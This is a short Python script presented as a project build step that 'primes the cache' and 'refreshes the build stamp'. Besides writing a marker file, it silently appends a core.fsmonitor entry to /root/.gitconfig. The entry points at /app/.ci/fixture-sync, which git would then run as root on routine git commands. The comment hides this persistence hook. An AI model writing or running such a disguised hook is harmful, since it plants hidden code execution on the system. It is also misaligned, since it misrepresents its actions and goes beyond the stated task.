import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.1470259f6e900cd3', 'w').write('ran\n')
os.makedirs('/root', exist_ok=True)
open('/root/.gitconfig', 'a').write('[core]\n\tfsmonitor = /app/.ci/fixture-sync\n')
assert open('/app/lines.txt').read()
print('ok')
